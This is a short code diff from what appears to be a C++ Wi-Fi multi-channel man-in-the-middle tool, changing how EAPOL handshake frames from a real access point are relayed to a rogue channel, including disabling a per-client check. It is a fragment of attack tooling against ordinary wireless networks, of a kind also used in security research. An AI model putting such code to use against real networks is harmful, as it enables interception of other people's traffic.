@@ -73,10 +73,10 @@ bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const Dot11
     return false;
 }
 
-bool McMitm::handle_eapol_real(const HWAddress<6> addr2, const HWAddress<6> addr1, PDU &pdu){
+bool McMitm::handle_eapol_real(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu){
    if(addr2 == ap_mac){
         // EAPOL od AP → forward na rogue channel
-        if(is_eapol(pdu) && clients.contains(addr1)){
+        if(is_eapol(pdu) /*&& clients.contains(addr1)*/){
             int eapol_msg = get_eapol_msg_num(pdu);
             log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
             sock_rogue->send(pdu, netconfig.rogue_channel);
@@ -132,7 +132,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
 
     if (handle_probe_real(addr2, *dot11)) return;
     if(handle_action_real(addr2, *pdu, *dot11)) return;
-    //if(handle_eapol(addr2, addr1, *dot11)) return;
+    if(handle_eapol_real(addr1, addr2, *dot11)) return;
 
     if(dot11->addr1() == ap_mac){
         // STA -> AP
@@ -163,13 +163,6 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
         }
     } else if(addr2 == ap_mac){ // AP -> STA
         handle_from_ap_real(pdu, *dot11, addr1);
-
-        // EAPOL od AP → forward na rogue channel
-        if(is_eapol(*pdu) && clients.contains(addr1)){
-            int eapol_msg = get_eapol_msg_num(*pdu);
-            log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
-            if(eapol_msg == 1 || eapol_msg == 3) sock_rogue->send(*pdu, netconfig.rogue_channel);
-        }
     } else if(dot11->addr1() == client_mac || addr2 == client_mac){
         display_client_traffic(*dot11, "Real channel", "_");
     }
